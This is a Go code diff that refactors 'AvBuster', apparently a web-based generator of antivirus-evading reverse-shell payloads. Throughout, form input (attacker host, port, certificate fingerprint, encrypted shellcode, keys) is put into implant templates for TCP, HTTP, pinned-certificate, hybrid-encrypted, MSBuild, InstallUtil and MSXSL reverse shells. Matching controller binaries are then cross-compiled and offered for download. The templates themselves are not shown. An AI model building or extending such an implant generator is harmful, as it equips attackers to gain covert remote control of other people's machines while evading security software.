@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"bytes"
 	"compress/flate"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"html/template"
@@ -47,6 +48,14 @@ type UserValues struct {
 	apptype               string
 }
 
+type UserSelectedOsDetails struct {
+	apptype               string
+	targetos              string
+	targetarchitecture    string
+	controlleros          string
+	controllerachitecture string
+}
+
 var appconfig baseframe
 var dwnloadlink DownloadLink
 var avbustertemplate *template.Template
@@ -82,75 +91,81 @@ func checkerror(err error) {
 	}
 }
 
-func prepareEncryptedShellCode(userselectedval UserValues, ismanager bool) {
+func (currentuservals *UserValues) prepareEncryptedShellCode(ismanager bool) {
 	var setpath string
-	fmt.Println(userselectedval.saveas)
+	fmt.Println(currentuservals.saveas)
 	if ismanager {
-		dwnloadlink.Link = `download` + string(os.PathSeparator) + userselectedval.saveas + "manager" + ".exe"
+		dwnloadlink.Link = `download` + string(os.PathSeparator) + currentuservals.saveas + "manager" + ".exe"
 		setpath = manageroutpath
 	} else {
 		setpath = outpath
-		dwnloadlink.Link = `download` + string(os.PathSeparator) + userselectedval.saveas + ".exe"
+		dwnloadlink.Link = `download` + string(os.PathSeparator) + currentuservals.saveas + ".exe"
 
 	}
 	newFile, err := os.Create(setpath)
 	checkerror(err)
-	scanner := bufio.NewScanner(strings.NewReader(userselectedval.binarytemplate))
+	scanner := bufio.NewScanner(strings.NewReader(currentuservals.binarytemplate))
 	for scanner.Scan() {
 		strline := scanner.Text()
 		if strings.Contains(strline, "@SHELL@") {
-			strline = strings.Replace(strline, "@SHELL@", userselectedval.shellcode, -1)
+			strline = strings.Replace(strline, "@SHELL@", currentuservals.shellcode, -1)
 			//fmt.Println(portreplaced)
 		}
 		if strings.Contains(strline, ":KEY") {
-			strline = strings.Replace(strline, ":KEY", userselectedval.shellcodedeckey, 1)
+			strline = strings.Replace(strline, ":KEY", currentuservals.shellcodedeckey, 1)
 		}
 		newFile.WriteString(strline + "\n")
 	}
 
 	newFile.Close()
 	finflag := make(chan string)
-	go avbusterbuildgoexe(finflag, dwnloadlink.Link, setpath, userselectedval, ismanager)
+	osandappdetails := UserSelectedOsDetails{}
+	osandappdetails.apptype = currentuservals.apptype
+	osandappdetails.controlleros = currentuservals.controlleros
+	osandappdetails.controllerachitecture = currentuservals.controllerachitecture
+	osandappdetails.targetos = currentuservals.targetos
+	osandappdetails.targetarchitecture = currentuservals.targetarchitecture
+	go osandappdetails.avbusterbuildgoexe(finflag, dwnloadlink.Link, setpath, ismanager)
 	<-finflag
 }
-func createavbusterpayload(userselectedval UserValues, ismanager bool, isCs bool) {
+func (currentuservals *UserValues) createavbusterpayload(ismanager bool, isCs bool) {
 	var setpath, valuetowrite string
-	fmt.Println(userselectedval.saveas)
+	fmt.Println(currentuservals.saveas)
 	if ismanager {
 		if runtime.GOOS == "windows" {
-			dwnloadlink.Link = `download` + string(os.PathSeparator) + userselectedval.saveas + "manager" + ".exe"
+			dwnloadlink.Link = `download` + string(os.PathSeparator) + currentuservals.saveas + "manager" + ".exe"
 			setpath = manageroutpath
 		} else {
-			dwnloadlink.Link = `download` + string(os.PathSeparator) + userselectedval.saveas + "manager"
+			dwnloadlink.Link = `download` + string(os.PathSeparator) + currentuservals.saveas + "manager"
 			setpath = manageroutpath
 		}
 	} else {
-		if userselectedval.targetos == "windows" {
+		if currentuservals.targetos == "windows" {
 			setpath = outpath
-			dwnloadlink.Link = `download` + string(os.PathSeparator) + userselectedval.saveas + ".exe"
+			dwnloadlink.Link = `download` + string(os.PathSeparator) + currentuservals.saveas + ".exe"
 		} else {
 			setpath = outpath
-			dwnloadlink.Link = `download` + string(os.PathSeparator) + userselectedval.saveas
+			dwnloadlink.Link = `download` + string(os.PathSeparator) + currentuservals.saveas
 		}
 	}
-	ipandport := userselectedval.lhost + ":" + userselectedval.lport
-	ipandportreplaced := strings.Replace(userselectedval.binarytemplate, "REVIPPORT", ipandport, 1)
-	frpintreplaced := strings.Replace(ipandportreplaced, "FPRINT", userselectedval.fingerprint, 1)
-	managerfinalval := strings.Replace(frpintreplaced, "REVPRT", userselectedval.lport, -1)
+	ipandport := currentuservals.lhost + ":" + currentuservals.lport
+	ipandportreplaced := strings.Replace(currentuservals.binarytemplate, "REVIPPORT", ipandport, 1)
+	frpintreplaced := strings.Replace(ipandportreplaced, "FPRINT", currentuservals.fingerprint, 1)
+	managerfinalval := strings.Replace(frpintreplaced, "REVPRT", currentuservals.lport, -1)
 	replaceunwantedchars := strings.Replace(managerfinalval, "RPL", "`", -1)
 	//fmt.Println(managerfinalval)
-	ipreplaced := strings.Replace(replaceunwantedchars, "RHOST", userselectedval.lhost, 1)
-	portreplaced := strings.Replace(ipreplaced, "RPORT", userselectedval.lport, 1)
+	ipreplaced := strings.Replace(replaceunwantedchars, "RHOST", currentuservals.lhost, 1)
+	portreplaced := strings.Replace(ipreplaced, "RPORT", currentuservals.lport, 1)
 	if strings.Contains(portreplaced, "@SHELL@") {
-		valuetowrite = strings.Replace(portreplaced, "@SHELL@", userselectedval.shellcode, -1)
+		valuetowrite = strings.Replace(portreplaced, "@SHELL@", currentuservals.shellcode, -1)
 		fmt.Println(portreplaced)
 	}
-	valuetowrite = strings.Replace(portreplaced, ":KEY", userselectedval.shellcodedeckey, 1)
+	valuetowrite = strings.Replace(portreplaced, ":KEY", currentuservals.shellcodedeckey, 1)
 
-	if strings.TrimSpace(userselectedval.privatekey) != "" &&
-		strings.TrimSpace(userselectedval.publickey) != "" {
-		valuetowrite = strings.Replace(valuetowrite, "PVTKEY", userselectedval.privatekey, 1)
-		valuetowrite = strings.Replace(valuetowrite, "PUBKEY", userselectedval.publickey, 1)
+	if strings.TrimSpace(currentuservals.privatekey) != "" &&
+		strings.TrimSpace(currentuservals.publickey) != "" {
+		valuetowrite = strings.Replace(valuetowrite, "PVTKEY", currentuservals.privatekey, 1)
+		valuetowrite = strings.Replace(valuetowrite, "PUBKEY", currentuservals.publickey, 1)
 	}
 	newFile, err := os.Create(setpath)
 	checkerror(err)
@@ -163,45 +178,53 @@ func createavbusterpayload(userselectedval UserValues, ismanager bool, isCs bool
 		go avbusterbuildcsexe(finflag, dwnloadlink.Link, setpath)
 		<-finflag
 	} else {
-		if ismanager {
+		osandappdetails := UserSelectedOsDetails{}
+		osandappdetails.apptype = currentuservals.apptype
+		osandappdetails.controlleros = currentuservals.controlleros
+		osandappdetails.controllerachitecture = currentuservals.controllerachitecture
+		osandappdetails.targetos = currentuservals.targetos
+		osandappdetails.targetarchitecture = currentuservals.targetarchitecture
+		go osandappdetails.avbusterbuildgoexe(finflag, dwnloadlink.Link, setpath, ismanager)
+
+		/*if ismanager {
 			go avbusterbuildgoexe(finflag, dwnloadlink.Link, setpath, userselectedval, ismanager)
 			<-finflag
 		} else {
 			go avbusterbuildgoexe(finflag, dwnloadlink.Link, setpath, userselectedval, ismanager)
 			<-finflag
-		}
+		}*/
 	}
 }
 
-func createavbusterGUIpayload(userselectedval UserValues, ismanager bool) {
+func (currentuservals *UserValues) createavbusterGUIpayload(ismanager bool) {
 	var setpath, valuetowrite string
-	fmt.Println(userselectedval.saveas)
+	fmt.Println(currentuservals.saveas)
 	if ismanager {
-		dwnloadlink.Link = `download` + string(os.PathSeparator) + userselectedval.saveas + "manager" + ".exe"
+		dwnloadlink.Link = `download` + string(os.PathSeparator) + currentuservals.saveas + "manager" + ".exe"
 		setpath = manageroutpath
 	} else {
 		setpath = outpath
-		dwnloadlink.Link = `download` + string(os.PathSeparator) + userselectedval.saveas + ".exe"
+		dwnloadlink.Link = `download` + string(os.PathSeparator) + currentuservals.saveas + ".exe"
 
 	}
 	//if ismanager {
 	//fmt.Println(setpath)
 	//}
 	//fmt.Println(userselectedval.binarytemplate)
-	ipandport := userselectedval.lhost + ":" + userselectedval.lport
-	ipandportreplaced := strings.Replace(userselectedval.binarytemplate, "REVIPPORT", ipandport, 1)
-	frpintreplaced := strings.Replace(ipandportreplaced, "FPRINT", userselectedval.fingerprint, 1)
-	managerfinalval := strings.Replace(frpintreplaced, "REVPRT", userselectedval.lport, -1)
+	ipandport := currentuservals.lhost + ":" + currentuservals.lport
+	ipandportreplaced := strings.Replace(currentuservals.binarytemplate, "REVIPPORT", ipandport, 1)
+	frpintreplaced := strings.Replace(ipandportreplaced, "FPRINT", currentuservals.fingerprint, 1)
+	managerfinalval := strings.Replace(frpintreplaced, "REVPRT", currentuservals.lport, -1)
 	replaceunwantedchars := strings.Replace(managerfinalval, "RPL", "`", -1)
 	//fmt.Println(managerfinalval)
-	ipreplaced := strings.Replace(replaceunwantedchars, "RHOST", userselectedval.lhost, 1)
-	portreplaced := strings.Replace(ipreplaced, "RPORT", userselectedval.lport, 1)
-	valuetowrite = strings.Replace(portreplaced, "SHELLCODEHERE", userselectedval.shellcode, 1)
+	ipreplaced := strings.Replace(replaceunwantedchars, "RHOST", currentuservals.lhost, 1)
+	portreplaced := strings.Replace(ipreplaced, "RPORT", currentuservals.lport, 1)
+	valuetowrite = strings.Replace(portreplaced, "SHELLCODEHERE", currentuservals.shellcode, 1)
 
-	if strings.TrimSpace(userselectedval.privatekey) != "" &&
-		strings.TrimSpace(userselectedval.publickey) != "" {
-		valuetowrite = strings.Replace(valuetowrite, "PVTKEY", userselectedval.privatekey, 1)
-		valuetowrite = strings.Replace(valuetowrite, "PUBKEY", userselectedval.publickey, 1)
+	if strings.TrimSpace(currentuservals.privatekey) != "" &&
+		strings.TrimSpace(currentuservals.publickey) != "" {
+		valuetowrite = strings.Replace(valuetowrite, "PVTKEY", currentuservals.privatekey, 1)
+		valuetowrite = strings.Replace(valuetowrite, "PUBKEY", currentuservals.publickey, 1)
 	}
 
 	//fmt.Println(valuetowrite)
@@ -217,35 +240,35 @@ func createavbusterGUIpayload(userselectedval UserValues, ismanager bool) {
 	go avbusterGUIbuilder(finflag, dwnloadlink.Link, setpath)
 	<-finflag
 }
-func createavbusterCSConsolePayload(userselectedval UserValues, ismanager bool) {
+func (currentuservals *UserValues) createavbusterCSConsolePayload(ismanager bool) {
 	var setpath, valuetowrite string
-	fmt.Println(userselectedval.saveas)
+	fmt.Println(currentuservals.saveas)
 	if ismanager {
-		dwnloadlink.Link = "download" + string(os.PathSeparator) + userselectedval.saveas + "manager" + ".exe"
+		dwnloadlink.Link = "download" + string(os.PathSeparator) + currentuservals.saveas + "manager" + ".exe"
 		setpath = manageroutpath
 	} else {
 		setpath = outpath
-		dwnloadlink.Link = `download` + string(os.PathSeparator) + userselectedval.saveas + ".exe"
+		dwnloadlink.Link = `download` + string(os.PathSeparator) + currentuservals.saveas + ".exe"
 
 	}
 	//if ismanager {
 	//fmt.Println(setpath)
 	//}
 	//fmt.Println(userselectedval.binarytemplate)
-	ipandport := userselectedval.lhost + ":" + userselectedval.lport
-	ipandportreplaced := strings.Replace(userselectedval.binarytemplate, "REVIPPORT", ipandport, 1)
-	frpintreplaced := strings.Replace(ipandportreplaced, "FPRINT", userselectedval.fingerprint, 1)
-	managerfinalval := strings.Replace(frpintreplaced, "REVPRT", userselectedval.lport, -1)
+	ipandport := currentuservals.lhost + ":" + currentuservals.lport
+	ipandportreplaced := strings.Replace(currentuservals.binarytemplate, "REVIPPORT", ipandport, 1)
+	frpintreplaced := strings.Replace(ipandportreplaced, "FPRINT", currentuservals.fingerprint, 1)
+	managerfinalval := strings.Replace(frpintreplaced, "REVPRT", currentuservals.lport, -1)
 	replaceunwantedchars := strings.Replace(managerfinalval, "RPL", "`", -1)
 	//fmt.Println(managerfinalval)
-	ipreplaced := strings.Replace(replaceunwantedchars, "RHOST", userselectedval.lhost, 1)
-	portreplaced := strings.Replace(ipreplaced, "RPORT", userselectedval.lport, 1)
-	valuetowrite = strings.Replace(portreplaced, "SHELLCODEHERE", userselectedval.shellcode, 1)
+	ipreplaced := strings.Replace(replaceunwantedchars, "RHOST", currentuservals.lhost, 1)
+	portreplaced := strings.Replace(ipreplaced, "RPORT", currentuservals.lport, 1)
+	valuetowrite = strings.Replace(portreplaced, "SHELLCODEHERE", currentuservals.shellcode, 1)
 
-	if strings.TrimSpace(userselectedval.privatekey) != "" &&
-		strings.TrimSpace(userselectedval.publickey) != "" {
-		valuetowrite = strings.Replace(valuetowrite, "PVTKEY", userselectedval.privatekey, 1)
-		valuetowrite = strings.Replace(valuetowrite, "PUBKEY", userselectedval.publickey, 1)
+	if strings.TrimSpace(currentuservals.privatekey) != "" &&
+		strings.TrimSpace(currentuservals.publickey) != "" {
+		valuetowrite = strings.Replace(valuetowrite, "PVTKEY", currentuservals.privatekey, 1)
+		valuetowrite = strings.Replace(valuetowrite, "PUBKEY", currentuservals.publickey, 1)
 	}
 
 	//fmt.Println(valuetowrite)
@@ -370,13 +393,13 @@ func avbusterGUIbuilder(finflag chan string, exepath, csfilepath string) {
 
 }
 
-func avbusterbuildgoexe(finflag chan string, exepath, gofilepath string, userselectedval UserValues, isManager bool) {
+func (userslectedOsandapptype *UserSelectedOsDetails) avbusterbuildgoexe(finflag chan string, exepath, gofilepath string, isManager bool) {
 	var arch, ostype string
-	arch = userselectedval.targetarchitecture
-	ostype = userselectedval.targetos
+	arch = userslectedOsandapptype.targetarchitecture
+	ostype = userslectedOsandapptype.targetos
 	if isManager {
-		arch = userselectedval.controllerachitecture
-		ostype = userselectedval.controlleros
+		arch = userslectedOsandapptype.controllerachitecture
+		ostype = userslectedOsandapptype.controlleros
 	}
 	if runtime.GOOS == "linux" {
 		cmdpath, _ := exec.LookPath("bash")
@@ -384,7 +407,7 @@ func avbusterbuildgoexe(finflag chan string, exepath, gofilepath string, usersel
 		if isManager {
 			execargs = "GOOS=" + ostype + " GOARCH=" + arch + " go build -o " + exepath + " " + gofilepath
 		} else {
-			if userselectedval.apptype == "Console" {
+			if userslectedOsandapptype.apptype == "Console" {
 				execargs = "GOOS=" + ostype + " GOARCH=" + arch + " go build -o " + exepath + " " + gofilepath
 			} else {
 				execargs = "GOOS=" + ostype + " GOARCH=" + arch + " go build -ldflags -H=windowsgui -o " + exepath + " " + gofilepath
@@ -419,7 +442,7 @@ func avbusterbuildgoexe(finflag chan string, exepath, gofilepath string, usersel
 		if isManager {
 			buildbat.WriteString("go build -o " + exepath + " " + gofilepath)
 		} else {
-			if userselectedval.apptype == "Console" {
+			if userslectedOsandapptype.apptype == "Console" {
 				buildbat.WriteString("go build -o " + exepath + " " + gofilepath)
 			} else {
 				buildbat.WriteString("go build -ldflags -H=windowsgui -o " + exepath + " " + gofilepath)
@@ -487,7 +510,7 @@ func processhttpsmeterpretershell(req *http.Request) {
 	checkerror(err)
 }
 
-func processpinnedcertrevshell(req *http.Request) {
+func (currentuservals *UserValues) processpinnedcertrevshell(req *http.Request) {
 	err := req.ParseForm()
 	checkerror(err)
 	saveas := req.Form.Get("saveas")
@@ -502,7 +525,7 @@ func processpinnedcertrevshell(req *http.Request) {
 	fingerprint := req.Form.Get("fprint")
 	shelltype := req.Form.Get("shelltype")
 	controllerachitecture := req.Form.Get("cntarchtype")
-	currentuservals := UserValues{}
+	//currentuservals := UserValues{}
 	currentuservals.lhost = lhost
 	currentuservals.lport = lport
 	currentuservals.targetos = strings.ToLower(targetos)
@@ -529,15 +552,15 @@ func processpinnedcertrevshell(req *http.Request) {
 	manageroutpath = `outfiles` + string(os.PathSeparator) + `pinnedcertmanager.go`
 	currentuservals.binarytemplate = binarytemplates.AvBusterPinnedCertReverseShell
 	fmt.Println("building pinned cert revshell")
-	createavbusterpayload(currentuservals, false, false)
+	currentuservals.createavbusterpayload(false, false)
 
 	currentuservals.binarytemplate = binarytemplates.AvBusterPinnedCertReverseShellManager
-	createavbusterpayload(currentuservals, true, false)
+	currentuservals.createavbusterpayload(true, false)
 	os.Remove(outpath)
 	os.Remove(manageroutpath)
 }
 
-func processselfsignedrevshell(req *http.Request) {
+func (currentuservals *UserValues) processselfsignedrevshell(req *http.Request) {
 	err := req.ParseForm()
 	checkerror(err)
 	saveas := req.Form.Get("saveas")
@@ -552,7 +575,7 @@ func processselfsignedrevshell(req *http.Request) {
 	controlleros := req.Form.Get("cntostype")
 	controllerarchtype := req.Form.Get("cntarchtype")
 
-	currentuservals := UserValues{}
+	//currentuservals := UserValues{}
 	currentuservals.lhost = lhost
 	currentuservals.lport = lport
 	currentuservals.targetos = strings.ToLower(targetos)
@@ -576,14 +599,14 @@ func processselfsignedrevshell(req *http.Request) {
 	manageroutpath = `outfiles` + string(os.PathSeparator) + `httpsrevshellmanager.go`
 	currentuservals.binarytemplate = binarytemplates.AvBusterSelfSignedHttps
 	fmt.Println("building http revshell")
-	createavbusterpayload(currentuservals, false, false)
+	currentuservals.createavbusterpayload(false, false)
 	currentuservals.binarytemplate = binarytemplates.AvBusterSelfSignedHttpsManager
-	createavbusterpayload(currentuservals, true, false)
+	currentuservals.createavbusterpayload(true, false)
 	os.Remove(outpath)
 	os.Remove(manageroutpath)
 }
 
-func processmsbuildrevshell(req *http.Request) {
+func (currentuservals *UserValues) processmsbuildrevshell(req *http.Request) {
 	var archtype string
 	err := req.ParseForm()
 	saveas := req.Form.Get("saveas")
@@ -599,7 +622,7 @@ func processmsbuildrevshell(req *http.Request) {
 	ostype := "windows"
 	archtype = "386"
 
-	currentuservals := UserValues{}
+	//currentuservals := UserValues{}
 	currentuservals.lhost = lhost
 	currentuservals.lport = lport
 	currentuservals.targetos = ostype
@@ -611,13 +634,13 @@ func processmsbuildrevshell(req *http.Request) {
 		outpath = `outfiles` + string(os.PathSeparator) + `msbuild.cs`
 		currentuservals.binarytemplate = binarytemplates.AvBusterMSBuildTCPReverseShellCS
 		fmt.Println("building msbuild console")
-		createavbusterpayload(currentuservals, false, true)
+		currentuservals.createavbusterpayload(false, true)
 
 	} else {
 		outpath = `outfiles` + string(os.PathSeparator) + `msbuildgui.cs`
 		currentuservals.binarytemplate = binarytemplates.AvBusterMsBuildTCPReverseShellGUI
 		fmt.Println("building GUI msbuild gui revshell")
-		createavbusterGUIpayload(currentuservals, false)
+		currentuservals.createavbusterGUIpayload(false)
 
 	}
 
@@ -629,7 +652,7 @@ func processmsbuildrevshell(req *http.Request) {
 	os.Remove(outpath)
 }
 
-func processinstallutilrevshell(req *http.Request) {
+func (currentuservals *UserValues) processinstallutilrevshell(req *http.Request) {
 	var archtype string
 	err := req.ParseForm()
 	checkerror(err)
@@ -643,7 +666,7 @@ func processinstallutilrevshell(req *http.Request) {
 	ostype := "windows"
 	archtype = "386"
 
-	currentuservals := UserValues{}
+	//currentuservals := UserValues{}
 	currentuservals.lhost = lhost
 	currentuservals.lport = lport
 	currentuservals.targetos = ostype
@@ -654,12 +677,12 @@ func processinstallutilrevshell(req *http.Request) {
 	outpath = `outfiles` + string(os.PathSeparator) + `installutil.go`
 	currentuservals.binarytemplate = binarytemplates.AvBusterInstallShieldTCPReverseShell
 	fmt.Println("building installutil revshell")
-	createavbusterpayload(currentuservals, false, false)
+	currentuservals.createavbusterpayload(false, false)
 
 	os.Remove(outpath)
 }
 
-func processmsxsltrevshell(req *http.Request) {
+func (currentuservals *UserValues) processmsxsltrevshell(req *http.Request) {
 	var archtype string
 	err := req.ParseForm()
 	checkerror(err)
@@ -674,7 +697,7 @@ func processmsxsltrevshell(req *http.Request) {
 	ostype := "windows"
 	archtype = "386"
 
-	currentuservals := UserValues{}
+	//currentuservals := UserValues{}
 	currentuservals.lhost = lhost
 	currentuservals.lport = lport
 	currentuservals.targetos = ostype
@@ -686,19 +709,19 @@ func processmsxsltrevshell(req *http.Request) {
 		outpath = `outfiles` + string(os.PathSeparator) + `msxslt.cs`
 		currentuservals.binarytemplate = binarytemplates.AvBusterInlinerConsoleRevShell
 		fmt.Println("building msxslt")
-		createavbusterpayload(currentuservals, false, true)
+		currentuservals.createavbusterpayload(false, true)
 	} else {
 		outpath = `outfiles` + string(os.PathSeparator) + `msxsltgui.cs`
 		currentuservals.binarytemplate = binarytemplates.AvBusterInlinerGUIRevShell
 		fmt.Println("building GUI msxslt")
-		createavbusterGUIpayload(currentuservals, false)
+		currentuservals.createavbusterGUIpayload(false)
 
 	}
 	//clearoutfilefolder()
 	os.Remove(outpath)
 }
 
-func processencryptedcustomshellcode(req *http.Request) {
+func (currentuservals *UserValues) processencryptedcustomshellcode(req *http.Request) {
 	var archtype string
 	err := req.ParseForm()
 	checkerror(err)
@@ -711,7 +734,7 @@ func processencryptedcustomshellcode(req *http.Request) {
 	key := req.Form.Get("key")
 	shellcode := req.Form.Get("shellcode")
 
-	currentuservals := UserValues{}
+	//currentuservals := UserValues{}
 
 	currentuservals.targetos = ostype
 	currentuservals.shellcodedeckey = key
@@ -723,7 +746,7 @@ func processencryptedcustomshellcode(req *http.Request) {
 	outpath = `outfiles` + string(os.PathSeparator) + `encshell.go`
 	currentuservals.binarytemplate = binarytemplates.AvBusterEncryptedShellCode
 	fmt.Println("building encshellcode revshell")
-	prepareEncryptedShellCode(currentuservals, false)
+	currentuservals.prepareEncryptedShellCode(false)
 
 	os.Remove(outpath)
 }
@@ -738,39 +761,40 @@ func avbusterhomepage(httpw http.ResponseWriter, req *http.Request) {
 		err := req.ParseForm()
 		checkerror(err)
 		choice := req.Form.Get("selectedshelltype")
+		currentuservals := UserValues{}
 		if choice == "psrevshell" {
-			processpsrevshellbuild(req)
+			currentuservals.processpsrevshellbuild(req)
 		} else if choice == "msbuildrevshell" {
-			processmsbuildrevshell(req)
+			currentuservals.processmsbuildrevshell(req)
 		} else if choice == "hybridencrypted" {
-			processhybridencrypt(req)
+			currentuservals.processhybridencrypt(req)
 		} else if choice == "selfsigned" {
-			processselfsignedrevshell(req)
+			currentuservals.processselfsignedrevshell(req)
 		} else if choice == "customgo" {
-			processcustomgo(req)
+			currentuservals.processcustomgo(req)
 		} else if choice == "httprevshell" {
-			processhttprevshell(req)
+			currentuservals.processhttprevshell(req)
 		} else if choice == "pscsharprevshell" {
-			processpscsharp(req)
+			currentuservals.processpscsharp(req)
 		} else if choice == "installutilrevshell" {
-			processinstallutilrevshell(req)
+			currentuservals.processinstallutilrevshell(req)
 		} else if choice == "msxmlxslttcprevshell" {
-			processmsxsltrevshell(req)
+			currentuservals.processmsxsltrevshell(req)
 		} else if choice == "customdotnetrev" {
-			processcustomdotnet(req)
+			currentuservals.processcustomdotnet(req)
 		} else if choice == "encshellcode" {
-			processencryptedcustomshellcode(req)
+			currentuservals.processencryptedcustomshellcode(req)
 		} else if choice == "pinnedcert" {
-			processpinnedcertrevshell(req)
+			currentuservals.processpinnedcertrevshell(req)
 		} else if choice == "normaltcprev" {
-			processnormalrevtcp(req)
+			currentuservals.processnormalrevtcp(req)
 		}
 		err = avbustertemplate.Execute(httpw, nil)
 		checkerror(err)
 	}
 }
 
-func processpscsharp(req *http.Request) {
+func (currentuservals *UserValues) processpscsharp(req *http.Request) {
 	saveas := req.Form.Get("saveas")
 	if strings.TrimSpace(saveas) == "" {
 		saveas = "noname"
@@ -779,7 +803,7 @@ func processpscsharp(req *http.Request) {
 	lhost := req.Form.Get("lhost")
 	lport := req.Form.Get("lport")
 	apptype := req.Form.Get("shelltype")
-	currentuservals := UserValues{}
+	//currentuservals := UserValues{}
 	currentuservals.lhost = lhost
 	currentuservals.lport = lport
 	currentuservals.apptype = apptype
@@ -791,32 +815,32 @@ func processpscsharp(req *http.Request) {
 		outpath = "outfiles" + string(os.PathSeparator) + "pscsharprevtcp.cs"
 		currentuservals.binarytemplate = binarytemplates.AvBusterPSCsharpRevShellConsole
 		fmt.Println("building psrevshell")
-		createavbusterpayloadforpscsharp(currentuservals, false)
+		currentuservals.createavbusterpayloadforpscsharp(false)
 
 	} else {
 		outpath = "outfiles" + string(os.PathSeparator) + "pscsharprevgui.cs"
 		currentuservals.binarytemplate = binarytemplates.AvBusterPSCsharpRevShellGUI
 		fmt.Println("building GUI psrevshell")
-		createavbusterpayloadforpscsharp(currentuservals, true)
+		currentuservals.createavbusterpayloadforpscsharp(true)
 	}
 
 	os.Remove(outpath)
 }
 
-func createavbusterpayloadforpscsharp(userselectedval UserValues, isGui bool) {
+func (currentuservals *UserValues) createavbusterpayloadforpscsharp(isGui bool) {
 	var setpath string
 
-	fmt.Println(userselectedval.saveas)
-	if userselectedval.targetos == "windows" {
+	fmt.Println(currentuservals.saveas)
+	if currentuservals.targetos == "windows" {
 		setpath = outpath
-		dwnloadlink.Link = `download` + string(os.PathSeparator) + userselectedval.saveas + ".exe"
+		dwnloadlink.Link = `download` + string(os.PathSeparator) + currentuservals.saveas + ".exe"
 	} else {
 		setpath = outpath
-		dwnloadlink.Link = `download` + string(os.PathSeparator) + userselectedval.saveas
+		dwnloadlink.Link = `download` + string(os.PathSeparator) + currentuservals.saveas
 	}
 
-	ipreplaced := strings.Replace(userselectedval.binarytemplate, "RHOST", userselectedval.lhost, 1)
-	portreplaced := strings.Replace(ipreplaced, "RPORT", userselectedval.lport, 1)
+	ipreplaced := strings.Replace(currentuservals.binarytemplate, "RHOST", currentuservals.lhost, 1)
+	portreplaced := strings.Replace(ipreplaced, "RPORT", currentuservals.lport, 1)
 
 	newFile, err := os.Create(setpath)
 	checkerror(err)
@@ -828,6 +852,13 @@ func createavbusterpayloadforpscsharp(userselectedval UserValues, isGui bool) {
 	//fmt.Println(setpath)
 	go avbusterbuildpscsharpconsole(finflag, dwnloadlink.Link, setpath, isGui)
 	<-finflag
+
+}
+
+func decodebinarytemplate(encodedbinarytemplate string) string {
+	decodedstring, err := base64.StdEncoding.DecodeString(encodedbinarytemplate)
+	checkerror(err)
+	return string(decodedstring)
 
 }
 
@@ -880,7 +911,7 @@ func avbusterbuildpscsharpconsole(finflag chan string, exepath, csfilepath strin
 	finflag <- "Build Success"
 
 }
-func processhybridencrypt(req *http.Request) {
+func (currentuservals *UserValues) processhybridencrypt(req *http.Request) {
 	var archtype, controllerarchtype string
 	err := req.ParseForm()
 	checkerror(err)
@@ -908,7 +939,7 @@ func processhybridencrypt(req *http.Request) {
 
 	pvtkey := req.Form.Get("pvtkey")
 	pubkey := req.Form.Get("pubkey")
-	currentuservals := UserValues{}
+	//currentuservals := UserValues{}
 	currentuservals.lhost = lhost
 	currentuservals.lport = lport
 	currentuservals.targetos = ostype
@@ -924,15 +955,15 @@ func processhybridencrypt(req *http.Request) {
 	manageroutpath = "outfiles" + string(os.PathSeparator) + "hybridrevshellmanager.go"
 	currentuservals.binarytemplate = binarytemplates.AvBusterTCPHybridReverseShell
 	fmt.Println("building hybrid revshell")
-	createavbusterpayload(currentuservals, false, false)
+	currentuservals.createavbusterpayload(false, false)
 	currentuservals.binarytemplate = binarytemplates.AvBusterTCPHybridReverseShellManager
-	createavbusterpayload(currentuservals, true, false)
+	currentuservals.createavbusterpayload(true, false)
 
 	os.Remove(outpath)
 	os.Remove(manageroutpath)
 }
 
-func processhttprevshell(req *http.Request) {
+func (currentuservals *UserValues) processhttprevshell(req *http.Request) {
 	var controllerarchtype string
 	err := req.ParseForm()
 	checkerror(err)
@@ -945,7 +976,7 @@ func processhttprevshell(req *http.Request) {
 	targetos := req.Form.Get("ostype")
 	architecture := req.Form.Get("archtype")
 
-	currentuservals := UserValues{}
+	//currentuservals := UserValues{}
 	currentuservals.lhost = lhost
 	currentuservals.lport = lport
 	currentuservals.targetos = strings.ToLower(targetos)
@@ -971,15 +1002,15 @@ func processhttprevshell(req *http.Request) {
 	manageroutpath = `outfiles` + string(os.PathSeparator) + `httprevshellmanager.go`
 	currentuservals.binarytemplate = binarytemplates.AvBusterHttpReverseShell
 	fmt.Println("building http revshell")
-	createavbusterpayload(currentuservals, false, false)
+	currentuservals.createavbusterpayload(false, false)
 	currentuservals.binarytemplate = binarytemplates.AvBusterHttpReverseShellManager
-	createavbusterpayload(currentuservals, true, false)
+	currentuservals.createavbusterpayload(true, false)
 
 	os.Remove(outpath)
 	os.Remove(manageroutpath)
 }
 
-func processnormalrevtcp(req *http.Request) {
+func (currentuservals *UserValues) processnormalrevtcp(req *http.Request) {
 	var targetarchtype, controllerarchtype string
 	err := req.ParseForm()
 	checkerror(err)
@@ -996,7 +1027,7 @@ func processnormalrevtcp(req *http.Request) {
 	controlleros := "windows"
 	controllerarchtype = "386"
 
-	currentuservals := UserValues{}
+	//currentuservals := UserValues{}
 	currentuservals.lhost = lhost
 	currentuservals.lport = lport
 	currentuservals.targetos = targetostype
@@ -1009,12 +1040,12 @@ func processnormalrevtcp(req *http.Request) {
 	outpath = `outfiles` + string(os.PathSeparator) + `normaltcp.cs`
 	currentuservals.binarytemplate = binarytemplates.AvBusterSimpleRevShell
 	fmt.Println("building customdotnet revshell")
-	createavbusterpayload(currentuservals, false, true)
+	currentuservals.createavbusterpayload(false, true)
 
 	os.Remove(outpath)
 }
 
-func processcustomdotnet(req *http.Request) {
+func (currentuservals *UserValues) processcustomdotnet(req *http.Request) {
 	var targetarchtype, controllerarchtype string
 	err := req.ParseForm()
 	checkerror(err)
@@ -1031,7 +1062,7 @@ func processcustomdotnet(req *http.Request) {
 	controlleros := "windows"
 	controllerarchtype = "386"
 
-	currentuservals := UserValues{}
+	//currentuservals := UserValues{}
 	currentuservals.lhost = lhost
 	currentuservals.lport = lport
 	currentuservals.targetos = targetostype
@@ -1045,15 +1076,15 @@ func processcustomdotnet(req *http.Request) {
 	manageroutpath = "outfiles" + string(os.PathSeparator) + "customdotnet.cs"
 	currentuservals.binarytemplate = binarytemplates.AvBusterCustomCSharpRevShellClient
 	fmt.Println("building customdotnet revshell")
-	createavbusterpayload(currentuservals, false, true)
+	currentuservals.createavbusterpayload(false, true)
 	currentuservals.binarytemplate = binarytemplates.AvBusterCustomCSharpRevShellManager
-	createavbusterpayload(currentuservals, true, true)
+	currentuservals.createavbusterpayload(true, true)
 
 	os.Remove(outpath)
 	os.Remove(manageroutpath)
 }
 
